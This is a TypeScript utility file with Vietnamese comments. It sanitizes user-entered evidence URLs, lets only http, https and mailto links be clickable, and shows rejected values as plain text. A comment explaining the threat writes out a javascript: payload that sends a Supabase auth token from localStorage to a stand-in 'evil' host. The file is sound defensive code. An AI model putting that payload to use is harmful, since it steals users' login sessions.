/**
 * Lọc đường dẫn trước khi đưa vào thuộc tính href.
 *
 * React KHÔNG tự lọc href. Trường "bằng chứng đính kèm" (evidence_url) do cán bộ
 * tự gõ tự do, nên nếu render thẳng thì một người có thể lưu
 * `javascript:fetch('https://evil/?t='+localStorage.getItem('sb-...-auth-token'))`
 * — người duyệt bấm vào là mất phiên đăng nhập, vì token Supabase nằm ở localStorage.
 *
 * Chỉ cho qua http/https (và mailto cho tiện liên hệ). Mọi giá trị khác — kể cả
 * `javascript:`, `data:`, `vbscript:` — trả về undefined để nơi gọi hiển thị dạng
 * chữ thường thay vì tạo liên kết bấm được.
 */
const GIAO_THUC_AN_TOAN = new Set(['http:', 'https:', 'mailto:']);

export function safeHref(raw?: string | null): string | undefined {
  const s = (raw ?? '').trim();
  if (!s) return undefined;

  try {
    // base = origin hiện tại để chấp nhận cả đường dẫn tương đối ("/tai-lieu/x.pdf").
    const base = typeof window !== 'undefined' ? window.location.origin : 'https://localhost';
    const u = new URL(s, base);
    return GIAO_THUC_AN_TOAN.has(u.protocol) ? s : undefined;
  } catch {
    // Không phân tích được thành URL (vd cán bộ gõ mô tả ngắn thay vì link).
    return undefined;
  }
}

/**
 * Tách ô «bằng chứng» (evidence_url) do cán bộ tự gõ thành HAI phần cho dòng
 * thời gian: phần được phép bấm và phần chỉ để đọc.
 *
 * Vì sao cần hàm này thay vì gọi thẳng safeHref: hai bàn gọi trước đây viết
 * `safeHref(url) ?? url` — tức là ngay lúc bộ lọc từ chối một giá trị xấu thì
 * dòng `?? url` trả đúng giá trị đó về chỗ cũ, vô hiệu hoá chính bộ lọc. Sở dĩ
 * người viết thêm `?? url` là có lý do thật: bỏ hẳn thì chữ BIẾN MẤT khỏi màn
 * hình, mà ô này cán bộ hay gõ ghi chú («đã gửi qua Zalo cho anh Hùng») chứ
 * không chỉ gõ link — mất chữ là mất thông tin nghiệp vụ.
 *
 * Nên tách làm hai: `lienKet` chỉ nhận giá trị đã qua lọc, `chuThuong` giữ
 * nguyên văn để nơi gọi vẫn hiện chữ nhưng KHÔNG bấm được.
 */
export function tachBangChung(raw?: string | null): {
  /** Đường dẫn an toàn để đặt vào href; null nếu không có hoặc bị từ chối */
  lienKet: string | null;
  /** Nguyên văn cần hiện dạng chữ thường; null nếu đã nằm ở `lienKet` hoặc ô trống */
  chuThuong: string | null;
} {
  const goc = (raw ?? '').trim();
  if (!goc) return { lienKet: null, chuThuong: null };

  const daLoc = safeHref(goc);
  return daLoc ? { lienKet: daLoc, chuThuong: null } : { lienKet: null, chuThuong: goc };
}

/** true khi chuỗi là liên kết bấm được an toàn. */
export function laLienKetAnToan(raw?: string | null): boolean {
  return safeHref(raw) !== undefined;
}
